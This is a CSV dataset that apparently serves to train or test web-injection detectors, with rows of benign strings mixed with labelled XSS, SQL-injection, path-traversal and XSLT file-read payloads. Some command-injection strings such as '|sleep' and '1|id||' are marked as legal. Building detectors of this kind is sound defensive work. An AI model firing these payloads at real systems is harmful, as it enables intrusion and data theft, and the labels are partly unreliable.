index,payload,is_malicious,injection_type
1239,csx5xrvc,0.0,LEGAL
1240,sobbing,0.0,LEGAL
1241,"'><script>alert(1)</script>""` `>",1.0,XSS
1242,rm\x0bq96485831,0.0,LEGAL
1243,faceted,0.0,LEGAL
1244,moistly,0.0,LEGAL
1245,educativa,0.0,LEGAL
1246,ducked,0.0,LEGAL
1247,copper,0.0,LEGAL
1248,C%2F+Barja+187+,0.0,LEGAL
1249,dominate,0.0,LEGAL
1250,Amalle,0.0,LEGAL
1251,Simonne,0.0,LEGAL
1252,addressees,0.0,LEGAL
1253,"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1.0,SQL
1254,/..%25c0%25af..%25c0%25affile',1.0,SHELL
1255,condemnation,0.0,LEGAL
1256,babying,0.0,LEGAL
1257,denotative,0.0,LEGAL
1258,Emmeline,0.0,LEGAL
1259,vicissitudes,0.0,LEGAL
1260,hauling,0.0,LEGAL
1261,bottled,0.0,LEGAL
1262,Barrionuevo+Burunat,0.0,LEGAL
1263,Sinforosa,0.0,LEGAL
1264,lebars,0.0,LEGAL
1265,Orel,0.0,LEGAL
1266,1226,0.0,LEGAL
1267,Adella,0.0,LEGAL
1268,Thomasin,0.0,LEGAL
1269,gratuitous,0.0,LEGAL
1270,collaborative,0.0,LEGAL
1271,11398418D,0.0,LEGAL
1272,changeable,0.0,LEGAL
1273,Frayne,0.0,LEGAL
1274,Calle+Juan+Duque+169+4%3FD,0.0,LEGAL
1275,chubb,0.0,LEGAL
1276,46369,0.0,LEGAL
1277,6363,0.0,LEGAL
1278,http%3A%2F%2Fdigslifeofthejetsetter.blogspot.com%2F,0.0,LEGAL
1279,web_links,0.0,LEGAL
1280,casual,0.0,LEGAL
1281,Corral+de+Almaguer,0.0,LEGAL
1282,37770,0.0,LEGAL
1283,C%2F+Virgen+Del+Pilar+144+,0.0,LEGAL
1284,playtime,0.0,LEGAL
1285,Manciles,0.0,LEGAL
1286,%253Csvg%2520onload%253D%2522confirm%25287%2529%2522%253E,1.0,XSS
1287,Mikaela,0.0,LEGAL
1288,defocus,0.0,LEGAL
1289,determinism,0.0,LEGAL
1290,Florencia,0.0,LEGAL
1291,70,0.0,LEGAL
1292,dimensioned,0.0,LEGAL
1293,idol,0.0,LEGAL
1294,uninstall,0.0,LEGAL
1295,4620750068228156,0.0,LEGAL
1296,Tad,0.0,LEGAL
1297,Alwyn,0.0,LEGAL
1298,salve,0.0,LEGAL
1299,26222,0.0,LEGAL
1300,verifiable,0.0,LEGAL
1301,miraculous,0.0,LEGAL
1302,|sleep\x098\x09#,0.0,LEGAL
1303,"<a href=""about:<script>alert(1);</script>",1.0,XSS
1304,8708,0.0,LEGAL
1305,consultant,0.0,LEGAL
1306,alignment,0.0,LEGAL
1307,interpreter,0.0,LEGAL
1308,8559,0.0,LEGAL
1309,Melli,0.0,LEGAL
1310,83178933P,0.0,LEGAL
1311,straightens,0.0,LEGAL
1312,brea%40filtroselectroestaticos.ae,0.0,LEGAL
1313,macrophage,0.0,LEGAL
1314,wintering,0.0,LEGAL
1315,dialer,0.0,LEGAL
1316,Blumenthal,0.0,LEGAL
1317,odat_sac_hptxt_1000073%2CODAT_HPFP2001,0.0,LEGAL
1318,birdie,0.0,LEGAL
1319,declarations,0.0,LEGAL
1320,specializations,0.0,LEGAL
1321,diarrhea,0.0,LEGAL
1322,monument,0.0,LEGAL
1323,plummeting,0.0,LEGAL
1324,bart,0.0,LEGAL
1325,aperiodic,0.0,LEGAL
1326,)))) waitfor delay '0:0:20' /*,1.0,SQL
1327,Moshe,0.0,LEGAL
1328,5587871626794058,0.0,LEGAL
1329,Vidayanes,0.0,LEGAL
1330,oregano,0.0,LEGAL
1331,C%2F+De+Los+Colegios%2C+192+,0.0,LEGAL
1332,VAnGuaRDa,0.0,LEGAL
1333,detergent,0.0,LEGAL
1334,saint-cyr%40cenitsoria.tg,0.0,LEGAL
1335,austerely,0.0,LEGAL
1336,<svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>,1.0,XSS
1337,seem,0.0,LEGAL
1338,attics,0.0,LEGAL
1339,mating,0.0,LEGAL
1340,Snowbelt,0.0,LEGAL
1341,eventual,0.0,LEGAL
1342,San+Llorente,0.0,LEGAL
1343,1331921048,0.0,LEGAL
1344,Bolvir,0.0,LEGAL
1345,firearm,0.0,LEGAL
1346,Chris,0.0,LEGAL
1347,' or uname like '%,1.0,SQL
1348,dasha,0.0,LEGAL
1349,unnatural,0.0,LEGAL
1350,6010330300063048,0.0,LEGAL
1351,Avda.+Real+Academia+De+Medicina%2C+59+,0.0,LEGAL
1352,clients,0.0,LEGAL
1353,menfita,0.0,LEGAL
1354,food,0.0,LEGAL
1355,51620770F,0.0,LEGAL
1356,94505880F,0.0,LEGAL
1357,Bodenheim,0.0,LEGAL
1358,500);alert(1);//,1.0,XSS
1359,circuitry,0.0,LEGAL
1360,cloudburst,0.0,LEGAL
1361,14tom40,0.0,LEGAL
1362,minesweeper,0.0,LEGAL
1363,Calle+Fernando+Pinna+Casas%2C+17%2C+2-H,0.0,LEGAL
1364,Lena,0.0,LEGAL
1365,Victor+Juan,0.0,LEGAL
1366,Myra,0.0,LEGAL
1367,GarlaDORa,0.0,LEGAL
1368,Technion,0.0,LEGAL
1369,impropriety,0.0,LEGAL
1370,Dominick,0.0,LEGAL
1371,laforge,0.0,LEGAL
1372,13770802N,0.0,LEGAL
1373,asks,0.0,LEGAL
1374,1332008639,0.0,LEGAL
1375,fortification,0.0,LEGAL
1376,Pedraja+de+Portillo%2C+La,0.0,LEGAL
1377,J%E1ndula+Couttolenc,0.0,LEGAL
1378,<form><button formaction=javascript&colon;alert(1)>CLICKME,1.0,XSS
1379,econ%F3micamente,0.0,LEGAL
1380,Hatti,0.0,LEGAL
1381,Valdiviezo+Montull,0.0,LEGAL
1382,C%2F+Arc+De+Sant+Ramon+Del+Call%2C+189%2C+2-E,0.0,LEGAL
1383,&#X003c,1.0,XSS
1384,fascination,0.0,LEGAL
1385,relying,0.0,LEGAL
1386,reconsidered,0.0,LEGAL
1387,Siva,0.0,LEGAL
1388,stifled,0.0,LEGAL
1389,Xerta,0.0,LEGAL
1390,articulation,0.0,LEGAL
1391,physic,0.0,LEGAL
1392,currier%40soycatalan.jobs,0.0,LEGAL
1393,finalizing,0.0,LEGAL
1394,baud,0.0,LEGAL
1395,sublists,0.0,LEGAL
1396,34igant0d9,0.0,LEGAL
1397,tomcat,0.0,LEGAL
1398,41392002Y,0.0,LEGAL
1399,hutch,0.0,LEGAL
1400,37140,0.0,LEGAL
1401,conditions,0.0,LEGAL
1402,beset,0.0,LEGAL
1403,3091539982712608,0.0,LEGAL
1404,delavanti%40brunoseguridad.by,0.0,LEGAL
1405,Bobine,0.0,LEGAL
1406,rentals,0.0,LEGAL
1407,indeterminacy,0.0,LEGAL
1408,ID%3D4da595efca54d772%3AT%3D1252664878%3AS%3DALNI_MYLkFI2wff7-tB5zjrpLq-GC4Mr_Q,0.0,LEGAL
1409,Baldivieso,0.0,LEGAL
1410,perjura,0.0,LEGAL
1411,avenger,0.0,LEGAL
1412,toppled,0.0,LEGAL
1413,wastefulness,0.0,LEGAL
1414,De+Rivera,0.0,LEGAL
1415,bewail,0.0,LEGAL
1416,daly%40diagnosticoradiologico.jm,0.0,LEGAL
1417,blah,0.0,LEGAL
1418,permits,0.0,LEGAL
1419,Gri%F1%F3n,0.0,LEGAL
1420,574,0.0,LEGAL
1421,mash,0.0,LEGAL
1422,Lakewood,0.0,LEGAL
1423,culler,0.0,LEGAL
1424,bootstrapped,0.0,LEGAL
1425,academy,0.0,LEGAL
1426,mostres,0.0,LEGAL
1427,aluminum,0.0,LEGAL
1428,radicals,0.0,LEGAL
1429,abhor,0.0,LEGAL
1430,unicycle,0.0,LEGAL
1431,autocracy,0.0,LEGAL
1432,Kariotta,0.0,LEGAL
1433,nickey,0.0,LEGAL
1434,14100,0.0,LEGAL
1435,shop,0.0,LEGAL
1436,pitre,0.0,LEGAL
1437,legrand%40viajesinternacionales.si,0.0,LEGAL
1438,1400,0.0,LEGAL
1439,Bus%F3+Ugartechea,0.0,LEGAL
1440,activity,0.0,LEGAL
1441,Margaretha,0.0,LEGAL
1442,Lujanka,0.0,LEGAL
1443,Seth,0.0,LEGAL
1444,1258340597039,0.0,LEGAL
1445,shimmer,0.0,LEGAL
1446,3203257419298834,0.0,LEGAL
1447,joystick,0.0,LEGAL
1448,platen,0.0,LEGAL
1449,wrinkles,0.0,LEGAL
1450,gave,0.0,LEGAL
1451,Greeks,0.0,LEGAL
1452,monolithic,0.0,LEGAL
1453,Calle+Molin+El+Toro+28%2C+,0.0,LEGAL
1454,C%2F+Bobala+111+4A,0.0,LEGAL
1455,vine-clunes%40cor-jet.eh,0.0,LEGAL
1456,Jeffersonians,0.0,LEGAL
1457,unionized,0.0,LEGAL
1458,Connecticut,0.0,LEGAL
1459,optimize,0.0,LEGAL
1460,37766,0.0,LEGAL
1461,trisha,0.0,LEGAL
1462,examination,0.0,LEGAL
1463,8.5.0,0.0,LEGAL
1464,25225,0.0,LEGAL
1465,46432447R,0.0,LEGAL
1466,Pati+D%27en+Llimona%2C+30+,0.0,LEGAL
1467,chains,0.0,LEGAL
1468,crewing,0.0,LEGAL
1469,Adirondacks,0.0,LEGAL
1470,sprotte.banner%40furgos.com.es,0.0,LEGAL
1471,tricking,0.0,LEGAL
1472,desligar,0.0,LEGAL
1473,0767871,0.0,LEGAL
1474,besiegers,0.0,LEGAL
1475,objector,0.0,LEGAL
1476,entices,0.0,LEGAL
1477,opera,0.0,LEGAL
1478,verse,0.0,LEGAL
1479,09672248430878976413,0.0,LEGAL
1480,7691856591463732,0.0,LEGAL
1481,<script/v>confirm(/@jackmasa/)</script>,1.0,XSS
1482,23251820Q,0.0,LEGAL
1483,donovan,0.0,LEGAL
1484,no3otr46,0.0,LEGAL
1485,intercommunication,0.0,LEGAL
1486,64772397G,0.0,LEGAL
1487,31219,0.0,LEGAL
1488,indicates,0.0,LEGAL
1489,declining,0.0,LEGAL
1490,Pascale,0.0,LEGAL
1491,44561991C,0.0,LEGAL
1492,inclined,0.0,LEGAL
1493,Galveston,0.0,LEGAL
1494,iNMOl4Dor,0.0,LEGAL
1495,Lyndell,0.0,LEGAL
1496,uneven,0.0,LEGAL
1497,8971303615649056,0.0,LEGAL
1498,21613516W,0.0,LEGAL
1499,Luis%F3n,0.0,LEGAL
1500,47882,0.0,LEGAL
1501,waxes,0.0,LEGAL
1502,Praza+De+Armas%2C+175%2C+,0.0,LEGAL
1503,bars,0.0,LEGAL
1504,"""></script><script>prompt(1)</script>",1.0,XSS
1505,Samson,0.0,LEGAL
1506,ices,0.0,LEGAL
1507,khalid,0.0,LEGAL
1508,gamble,0.0,LEGAL
1509,Lamo+Gelber,0.0,LEGAL
1510,nilsson,0.0,LEGAL
1511,marni,0.0,LEGAL
1512,3631273433865643,0.0,LEGAL
1513,clicked,0.0,LEGAL
1514,04211,0.0,LEGAL
1515,parishes,0.0,LEGAL
1516,autoincrement,0.0,LEGAL
1517,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",1.0,SQL
1518,Leavenworth,0.0,LEGAL
1519,maskable,0.0,LEGAL
1520,Hui,0.0,LEGAL
1521,r57qu0ller3,0.0,LEGAL
1522,Capolat,0.0,LEGAL
1523,cast,0.0,LEGAL
1524,Carpathians,0.0,LEGAL
1525,blazers,0.0,LEGAL
1526,Cayla,0.0,LEGAL
1527,11225682776767941109,0.0,LEGAL
1528,c84a12a,0.0,LEGAL
1529,embedding,0.0,LEGAL
1530,lakers,0.0,LEGAL
1531,8o881si9le,0.0,LEGAL
1532,catalogo,0.0,LEGAL
1533,satisfies,0.0,LEGAL
1534,amsterdam%40mailboxrussia.nz,0.0,LEGAL
1535,shirleen,0.0,LEGAL
1536,isis,0.0,LEGAL
1537,dismisser,0.0,LEGAL
1538,sidewise,0.0,LEGAL
1539,austin,0.0,LEGAL
1540,Celeste,0.0,LEGAL
1541,"</script ""/*'/*><svg */; onload=alert(1) //>",1.0,XSS
1542,271983801,0.0,LEGAL
1543,prelate,0.0,LEGAL
1544,Anero+Duch,0.0,LEGAL
1545,Africans,0.0,LEGAL
1546,ejvzfro7meycb3_jj,0.0,LEGAL
1547,sociologists,0.0,LEGAL
1548,06150289133833138343,0.0,LEGAL
1549,blind,0.0,LEGAL
1550,calfskin,0.0,LEGAL
1551,tARGEt,0.0,LEGAL
1552,44923287D,0.0,LEGAL
1553,glimpses,0.0,LEGAL
1554,manual,0.0,LEGAL
1555,itemizing,0.0,LEGAL
1556,3521603835020472,0.0,LEGAL
1557,7709760846022131,0.0,LEGAL
1558,convincers,0.0,LEGAL
1559,Passatge+Badal%2C+31%2C+,0.0,LEGAL
1560,anja,0.0,LEGAL
1561,http%3A%2F%2Fsherry-sherrysenicardesigns.blogspot.com%2F,0.0,LEGAL
1562,tumults,0.0,LEGAL
1563,erect,0.0,LEGAL
1564,4433952243326220,0.0,LEGAL
1565,bricklayer,0.0,LEGAL
1566,incorrectness,0.0,LEGAL
1567,elaine,0.0,LEGAL
1568,AGiWqtxuml8ac0MAY_Tp1btCjHNGbat0rg,0.0,LEGAL
1569,paula,0.0,LEGAL
1570,kieunga,0.0,LEGAL
1571,christened,0.0,LEGAL
1572,00984662D,0.0,LEGAL
1573,wishful,0.0,LEGAL
1574,thate%40didacramirez.eu,0.0,LEGAL
1575,astringent,0.0,LEGAL
1576,Antoine,0.0,LEGAL
1577,reassures,0.0,LEGAL
1578,algie,0.0,LEGAL
1579,onions,0.0,LEGAL
1580,bjdns2.cncmax.cn,0.0,LEGAL
1581,feeling,0.0,LEGAL
1582,&queryText=%22/%3E%3CscRipt%3Ealert%28%22XSS%22%29%3C/scRipt%3E,1.0,XSS
1583,Chok,0.0,LEGAL
1584,&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;,1.0,XSS
1585,shih_brusse%40professionalhost.jp,0.0,LEGAL
1586,quail,0.0,LEGAL
1587,dissolve,0.0,LEGAL
1588,privy,0.0,LEGAL
1589,duffy,0.0,LEGAL
1590,Aurlie,0.0,LEGAL
1591,composites,0.0,LEGAL
1592,sentry,0.0,LEGAL
1593,malott,0.0,LEGAL
1594,50786,0.0,LEGAL
1595,09220629K,0.0,LEGAL
1596,http%3A%2F%2Fsitecitizenk.blogspot.com%2F2009%2F05%2Fshostakovich-y-sus-tres-ultimas.html,0.0,LEGAL
1597,2451542120615034,0.0,LEGAL
1598,strictly,0.0,LEGAL
1599,Fekri,0.0,LEGAL
1600,"'><img[a][b]src=x[d]onerror[c]=[e]""prompt(1)"">",1.0,XSS
1601,disgustedly,0.0,LEGAL
1602,avouch,0.0,LEGAL
1603,lena,0.0,LEGAL
1604,59072549Q,0.0,LEGAL
1605,minima,0.0,LEGAL
1606,dis2rim2_6,0.0,LEGAL
1607,mccaffria_malanowicz%40fbi-criminal-network.com.mr,0.0,LEGAL
1608,12boroz84or,0.0,LEGAL
1609,OR 3409=3409 AND ('pytW' LIKE 'pytY,1.0,SQL
1610,false,0.0,LEGAL
1611,maureen,0.0,LEGAL
1612,1930717762858369,0.0,LEGAL
1613,Coursey,0.0,LEGAL
1614,http%3A%2F%2Ftoxic,0.0,LEGAL
1615,10393,0.0,LEGAL
1616,/../../../../../../../../%2A,1.0,SHELL
1617,Genevilla,0.0,LEGAL
1618,Calle+Albia+De+Castro%2C+S%2FN+,0.0,LEGAL
1619,ID%3D8ed2d45e87f8d88a%3AT%3D1256727952%3AS%3DALNI_MbU6lWiNpSgDrE-CEPNvE7h2hm5cQ,0.0,LEGAL
1620,Avda.+Salustiano+Olozoga%2C+89%2C+13%3FH,0.0,LEGAL
1621,mortem,0.0,LEGAL
1622,Maible,0.0,LEGAL
1623,addetia,0.0,LEGAL
1624,C%2F+Doctor+Ferran%2C+193+,0.0,LEGAL
1625,Abel,0.0,LEGAL
1626,Gaspar,0.0,LEGAL
1627,http%3A%2F%2Ftwilightersanonymous.com%2Faccess-hollywood-new-interview-with-the-new-moon-vampires.html,0.0,LEGAL
1628,<svg><script ?>alert(1),1.0,XSS
1629,conclusions,0.0,LEGAL
1630,<script\x00>javascript:alert(1)</script>,1.0,XSS
1631,things,0.0,LEGAL
1632,Consolata,0.0,LEGAL
1633,studious,0.0,LEGAL
1634,guinea,0.0,LEGAL
1635,encamped,0.0,LEGAL
1636,ballplayers,0.0,LEGAL
1637,Abidjan,0.0,LEGAL
1638,Seyar,0.0,LEGAL
1639,audiences,0.0,LEGAL
1640,stretched,0.0,LEGAL
1641,Erminie,0.0,LEGAL
1642,tuft,0.0,LEGAL
1643,'><script>alert(\'\\/\\1\\/\\\')</script>,1.0,XSS
1644,Rafel+Carb%F3,0.0,LEGAL
1645,11133160X,0.0,LEGAL
1646,assaulted,0.0,LEGAL
1647,<x%09onxxx=1,1.0,XSS
1648,perrella,0.0,LEGAL
1649,Aristotle,0.0,LEGAL
1650,divergence,0.0,LEGAL
1651,soletero,0.0,LEGAL
1652,tingyue,0.0,LEGAL
1653,59760678P,0.0,LEGAL
1654,Rachel,0.0,LEGAL
1655,%21d12CAR3AD1ra,0.0,LEGAL
1656,chapman,0.0,LEGAL
1657,38623329G,0.0,LEGAL
1658,circumnavigate,0.0,LEGAL
1659,blase,0.0,LEGAL
1660,tanker,0.0,LEGAL
1661,geesman,0.0,LEGAL
1662,gavriel,0.0,LEGAL
1663,coexisting,0.0,LEGAL
1664,p44m8scu6916n,0.0,LEGAL
1665,propertied,0.0,LEGAL
1666,misanthrope,0.0,LEGAL
1667,pete,0.0,LEGAL
1668,spotting,0.0,LEGAL
1669,"<script>  (function (o) {   function exploit(x) {    if (x !== null)     confirm('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>",1.0,XSS
1670,switchman,0.0,LEGAL
1671,martingale,0.0,LEGAL
1672,Pascacio,0.0,LEGAL
1673,Nari,0.0,LEGAL
1674,4626512497808574,0.0,LEGAL
1675,"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1.0,XSS
1676,28473,0.0,LEGAL
1677,cited,0.0,LEGAL
1678,Andikoetxe+150+,0.0,LEGAL
1679,Somellera+Ardanuy,0.0,LEGAL
1680,35791705W,0.0,LEGAL
1681,cocked,0.0,LEGAL
1682,Valverde+de+Burguillos,0.0,LEGAL
1683,injects,0.0,LEGAL
1684,backstitched,0.0,LEGAL
1685,wallet,0.0,LEGAL
1686,3197,0.0,LEGAL
1687,Magil,0.0,LEGAL
1688,1647,0.0,LEGAL
1689,Billikens,0.0,LEGAL
1690,gabriell,0.0,LEGAL
1691,optimal,0.0,LEGAL
1692,"&month=dec&yr=""><script>alert(document.cookie)</script>",1.0,XSS
1693,Andia%2C+113+11G,0.0,LEGAL
1694,Sioux,0.0,LEGAL
1695,dougall,0.0,LEGAL
1696,Cherin,0.0,LEGAL
1697,Corbett,0.0,LEGAL
1698,Hardin,0.0,LEGAL
1699,Eris,0.0,LEGAL
1700,zoq3et1r8,0.0,LEGAL
1701,Plaza+Juan+Angel+Rubio+Ballesteros%2C+43%2C+,0.0,LEGAL
1702,ardis,0.0,LEGAL
1703,05151,0.0,LEGAL
1704,Sellees,0.0,LEGAL
1705, or 'a'='a,1.0,SQL
1706,byron%40vinavilano.gl,0.0,LEGAL
1707,Cathyleen,0.0,LEGAL
1708,33785,0.0,LEGAL
1709,"""<A HREF=""""//www.google.com/"""">XSS</A>""",1.0,XSS
1710,dairy,0.0,LEGAL
1711,ambiance,0.0,LEGAL
1712,Audy,0.0,LEGAL
1713,i2c871es8a9l1,0.0,LEGAL
1714,15965353827369326165,0.0,LEGAL
1715,mistaking,0.0,LEGAL
1716,sensible,0.0,LEGAL
1717,Leonelle,0.0,LEGAL
1718,euphoria,0.0,LEGAL
1719,garland.delubac%40bahiadelasirenas.tk,0.0,LEGAL
1720,cEaJO,0.0,LEGAL
1721,Castell%F3+Sargatal,0.0,LEGAL
1722,<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,1.0,XSS
1723,59,0.0,LEGAL
1724,Raju,0.0,LEGAL
1725,pretext,0.0,LEGAL
1726,trailed,0.0,LEGAL
1727,disambiguates,0.0,LEGAL
1728,Moran,0.0,LEGAL
1729,brainchild,0.0,LEGAL
1730,carlo_salcedo4%40nomao.wf,0.0,LEGAL
1731,agility,0.0,LEGAL
1732,Sula,0.0,LEGAL
1733,4576,0.0,LEGAL
1734,Lesbians,0.0,LEGAL
1735,bike,0.0,LEGAL
1736,squirrel,0.0,LEGAL
1737,1; waitfor delay '0:0:X'--,1.0,SQL
1738,primitive,0.0,LEGAL
1739,Cac%EDn,0.0,LEGAL
1740,carries,0.0,LEGAL
1741,woolwine0,0.0,LEGAL
1742,unimportant,0.0,LEGAL
1743,Audra,0.0,LEGAL
1744,cowling%40minimizar.bz,0.0,LEGAL
1745,Cerinza,0.0,LEGAL
1746,Sicily,0.0,LEGAL
1747,victimizes,0.0,LEGAL
1748,buildup,0.0,LEGAL
1749,Afke,0.0,LEGAL
1750,94335965Q,0.0,LEGAL
1751,50513,0.0,LEGAL
1752,apostles,0.0,LEGAL
1753,codee%40professionalhost.com.ph,0.0,LEGAL
1754,<input type=hidden onformchange=confirm(1)/>,1.0,XSS
1755,avalanching,0.0,LEGAL
1756,desamueblar,0.0,LEGAL
1757,%2C219779608,0.0,LEGAL
1758,240m%EDfe9o,0.0,LEGAL
1759,Ming-Chang,0.0,LEGAL
1760,enders,0.0,LEGAL
1761,kidnapper,0.0,LEGAL
1762,Ilise,0.0,LEGAL
1763,tossing,0.0,LEGAL
1764,Federica,0.0,LEGAL
1765,coconut,0.0,LEGAL
1766,guestbook,0.0,LEGAL
1767,red,0.0,LEGAL
1768,El+Empecinado+127+4%3FE,0.0,LEGAL
1769,<a onmouseover=location=’javascript:alert(1)>click,1.0,XSS
1770,reuters.linow%40enandorra.com.uy,0.0,LEGAL
1771,Viktoria,0.0,LEGAL
1772,lorber-albasiny%40cortinasartesol.pa,0.0,LEGAL
1773,"if(substring(USER(),1,4)=0x726f6f74,SLEEP(5),1)",1.0,SQL
1774,linkages,0.0,LEGAL
1775,chicken,0.0,LEGAL
1776,Unzaga+Gomariz,0.0,LEGAL
1777,changeably,0.0,LEGAL
1778,81177297Q,0.0,LEGAL
1779,slung,0.0,LEGAL
1780,22143,0.0,LEGAL
1781,"'></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>",1.0,XSS
1782,Michaeline,0.0,LEGAL
1783,restfulness,0.0,LEGAL
1784,stinkers,0.0,LEGAL
1785,hangover,0.0,LEGAL
1786,5598829911486654,0.0,LEGAL
1787,reconstructing,0.0,LEGAL
1788,posited,0.0,LEGAL
1789,reworks,0.0,LEGAL
1790,Castell-Platja+d%27Aro,0.0,LEGAL
1791,Paz,0.0,LEGAL
1792,Arevalo%2C+170%2C+,0.0,LEGAL
1793,"<A HREF=""http://66.102.7.147/"">XSS</A>",1.0,XSS
1794,kishore,0.0,LEGAL
1795,preassigned,0.0,LEGAL
1796,unmoved,0.0,LEGAL
1797,television,0.0,LEGAL
1798,c:\ftp,0.0,LEGAL
1799,strolled,0.0,LEGAL
1800,COsTana,0.0,LEGAL
1801,Leocricia,0.0,LEGAL
1802,rattlers,0.0,LEGAL
1803,3603684423770940,0.0,LEGAL
1804,insure,0.0,LEGAL
1805,5773,0.0,LEGAL
1806,does,0.0,LEGAL
1807,fraudulent,0.0,LEGAL
1808,farsighted,0.0,LEGAL
1809,Tuesday,0.0,LEGAL
1810,R%F3tova,0.0,LEGAL
1811,terribly,0.0,LEGAL
1812,amassing,0.0,LEGAL
1813,decennial,0.0,LEGAL
1814,deloria,0.0,LEGAL
1815,Junia,0.0,LEGAL
1816,flutters,0.0,LEGAL
1817,Australia,0.0,LEGAL
1818,rogue,0.0,LEGAL
1819,nicko,0.0,LEGAL
1820,De,0.0,LEGAL
1821,Trevor,0.0,LEGAL
1822,98100963Y,0.0,LEGAL
1823,"<STYLE>li {list-style-image: url(""javascript:alert('CrossSiteScripting')"");}</STYLE><UL><LI>CrossSiteScripting",1.0,XSS
1824,subcommittees,0.0,LEGAL
1825,decan%24ia,0.0,LEGAL
1826,Campoo+de+Yuso,0.0,LEGAL
1827,"'><var onmouseover=""prompt(1)"">X</var>",1.0,XSS
1828,renditions,0.0,LEGAL
1829,shoeing,0.0,LEGAL
1830,cowlick,0.0,LEGAL
1831,'><scrip<script>t>alert(1)</script>,1.0,XSS
1832,clods,0.0,LEGAL
1833,Jello,0.0,LEGAL
1834,<img onerror=”alert(1)”src=a>,1.0,XSS
1835,&#x003e,1.0,XSS
1836,subsystems,0.0,LEGAL
1837,&#60;SCRIPT SRC&#61;&#47;&#47;testsite.com&#47;.j&#62;,1.0,XSS
1838,bondage,0.0,LEGAL
1839,blast,0.0,LEGAL
1840,darting,0.0,LEGAL
1841,drouot%40am-si.to,0.0,LEGAL
1842,Meredith,0.0,LEGAL
1843,fascinate,0.0,LEGAL
1844,Edmonton,0.0,LEGAL
1845,reverends,0.0,LEGAL
1846,espanol,0.0,LEGAL
1847,1|id||,0.0,LEGAL
1848,11690,0.0,LEGAL
1849,chit,0.0,LEGAL
1850,husky,0.0,LEGAL
1851,Campos,0.0,LEGAL
1852,smeared,0.0,LEGAL
1853,mischievous,0.0,LEGAL
1854,"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",1.0,XSS
1855,C%2F+Mendez%2C+137+,0.0,LEGAL
1856,composite,0.0,LEGAL
1857,launderings,0.0,LEGAL
1858,a65esad0,0.0,LEGAL
1859,7a4an4e,0.0,LEGAL
1860,"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl""><xsl:template match=""/""><xsl:copy-of select=""document('/etc/passwd')""/></xsl:template></xsl:stylesheet>",1.0,XSS
1861,Nam-Kiet,0.0,LEGAL
1862,filarete,0.0,LEGAL
1863,49645694X,0.0,LEGAL
1864,acetate,0.0,LEGAL
1865,"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){confirm(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1.0,XSS
1866,"""><image src=""javascript:alert(1)"">",1.0,XSS
1867,my_egallery,0.0,LEGAL
1868,robinia,0.0,LEGAL
1869,codfish,0.0,LEGAL
1870,Diane,0.0,LEGAL
1871,Agudelo+Surumay,0.0,LEGAL
1872,<script for=document event=onreadystatechange>getElementById('safe123').click()</script>,1.0,XSS
1873,discerningly,0.0,LEGAL
1874,Calle+Bario+73%2C+4%3FG,0.0,LEGAL
1875,Karola,0.0,LEGAL
1876,37260,0.0,LEGAL
1877,edward,0.0,LEGAL
1878,&#X0003c;,1.0,XSS
1879,"del,q48924166",0.0,LEGAL
1880,Minnie,0.0,LEGAL
1881,fernande5,0.0,LEGAL
1882,restive,0.0,LEGAL
1883,inhabitable,0.0,LEGAL
